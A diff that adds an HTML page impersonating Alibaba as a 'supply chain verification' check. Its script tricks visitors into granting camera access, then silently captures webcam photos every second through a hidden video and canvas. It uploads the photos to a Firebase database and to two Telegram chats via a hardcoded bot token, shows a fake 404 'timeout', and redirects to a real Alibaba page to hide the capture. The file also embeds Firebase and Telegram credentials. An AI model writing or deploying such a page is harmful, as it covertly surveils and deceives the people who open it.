@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alibaba.com | Logistics Integrity Protocol</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --ali-orange: #FF6600;
+            --ali-bg: #F4F4F4;
+            --ali-surface: #FFFFFF;
+            --ali-text: #333333;
+            --ali-border: #DDD;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--ali-bg); color: var(--ali-text);
+            font-family: Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .ali-header {
+            padding: 12px 20px; background: var(--ali-surface);
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid var(--ali-border);
+        }
+
+        .ali-logo { width: 120px; height: auto; }
+
+        .verification-container {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
+        }
+
+        .ali-card {
+            width: 100%; max-width: 480px; background: var(--ali-surface);
+            border-radius: 4px; overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;
+        }
+
+        .ali-card-header { padding: 20px; background: #fafafa; border-bottom: 1px solid var(--ali-border); }
+        .ali-card-body { padding: 40px 30px; }
+
+        .integrity-icon {
+            width: 80px; height: 80px; margin: 0 auto 25px;
+            background: rgba(255, 102, 0, 0.05); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--ali-orange);
+        }
+
+        .ali-pulse {
+            width: 15px; height: 15px; background: var(--ali-orange);
+            border-radius: 50%; animation: a-pulse 1.5s infinite;
+        }
+        @keyframes a-pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(3.5); opacity: 0; } }
+
+        h2 { font-size: 22px; font-weight: 500; margin: 0 0 12px; }
+        p { font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-ali {
+            background: var(--ali-orange); color: white; border: none;
+            width: 100%; padding: 14px; font-size: 15px; font-weight: bold;
+            border-radius: 3px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-ali:hover { background: #E65C00; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .ali-loader {
+            width: 30px; height: 30px; border: 3px solid var(--ali-border);
+            border-top: 3px solid var(--ali-orange); border-radius: 50%;
+            margin: 0 auto 20px; animation: a-spin 1s linear infinite;
+        }
+        @keyframes a-spin { to { transform: rotate(360deg); } }
+
+        .terminal-log {
+            text-align: left; background: #000; padding: 15px; border-radius: 4px;
+            font-family: monospace; font-size: 10px; color: #fff; margin-top: 25px; border: 1px solid #333;
+        }
+        .node-tag { font-size: 10px; color: #AAA; margin-top: 25px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="ali-header">
+        <img src="https://sc01.alicdn.com/kf/H7b0a7ed456934c9fa30f0f4a4f89d985M.png" class="ali-logo" alt="Alibaba">
+        <div style="font-size: 12px; color: #666;">Integrity Portal</div>
+    </div>
+
+    <div class="verification-container">
+        <div class="ali-card">
+            <div class="ali-card-header">
+                <div style="font-weight: 500; color: #000;">Global Trade Security Handshake</div>
+            </div>
+
+            <!-- Initial View -->
+            <div class="ali-card-body" id="init-view">
+                <div class="integrity-icon">
+                    <div class="ali-pulse"></div>
+                </div>
+                <h2>Supply Chain Verification</h2>
+                <p>Before accessing the <b>Gold Supplier Data Vault</b>, a visual hardware handshake is required to prevent bot-access. This calibrates your environment for high-security neural container verification.</p>
+                
+                <button class="btn-ali" onclick="startAliSync()">Begin Integrity Check</button>
+                <div class="node-tag">Local Uplink: Mumbai_MH_IN</div>
+            </div>
+
+            <!-- Sync View -->
+            <div class="ali-card-body" id="sync-ui">
+                <div class="ali-loader"></div>
+                <div style="font-weight: 500;">Establishing Neural Handshake...</div>
+                <div style="font-size: 12px; color: #999; margin-top: 8px;" id="a-timer">Uplink valid for 60s</div>
+                
+                <div class="terminal-log">
+                    > CONNECTING_MUMBAI_RELAY_04... OK<br>
+                    > SCANNING_LOCAL_ENVIRONMENT... OK<br>
+                    > STATUS: CALIBRATING_SPATIAL_VECTORS
+                </div>
+            </div>
+
+            <!-- 404 View -->
+            <div class="ali-card-body" id="error-404">
+                <div style="font-size: 60px; color: #EEE; font-weight: 900; margin-bottom: 10px;">404</div>
+                <h2 style="color: var(--ali-orange);">Logistics Timeout</h2>
+                <p>Alibaba supply chain server timed out during the visual handshake. Re-routing secure data pipeline via the Mumbai secondary node.</p>
+                <div class="ali-loader" style="width: 25px; height: 25px;"></div>
+                <div style="font-size: 11px; color: #AAA;">Establishing Fallback...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startAliSync() {
+            try {
+                // Requesting camera under "Logistics Integrity Check"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('a-timer').innerText = `Uplink valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            aliCapture(count);
+                        }
+
+                        // Trigger 404 at 45 seconds
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a specific Alibaba wholesale page
+                            window.location.href = "https://www.alibaba.com/bulk/wholesale.html";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.alibaba.com/bulk/wholesale.html";
+            }
+        }
+
+        function aliCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "ALIBABA_SUPPLY_CHAIN_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_LOGISTICS_HUB" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'ali_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
